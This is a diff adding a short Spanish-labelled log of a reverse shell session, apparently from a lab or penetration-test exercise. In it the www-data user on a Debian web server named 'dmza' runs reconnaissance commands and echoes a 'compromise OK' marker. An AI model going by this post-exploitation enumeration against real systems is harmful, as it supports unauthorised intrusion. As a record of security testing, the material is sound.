@@ -1,0 +1,20 @@
+=== TRANSCRIPT ===
+=== reverse shell recibida desde 10.5.1.10:39512 ===
+bash: cannot set terminal process group (9805): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dmza:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@dmza:/var/www/html$ hostname
+dmza
+www-data@dmza:/var/www/html$ ip -br a
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+eth-0            UP             10.5.1.10/24 fe80::c8fe:ff:fe00:10a/64 
+www-data@dmza:/var/www/html$ head -2 /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
+NAME="Debian GNU/Linux"
+www-data@dmza:/var/www/html$ uname -a
+Linux dmza 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux
+www-data@dmza:/var/www/html$ echo '=== COMPROMISO DMZA OK ==='
+=== COMPROMISO DMZA OK ===
+www-data@dmza:/var/www/html$ exit
+exit
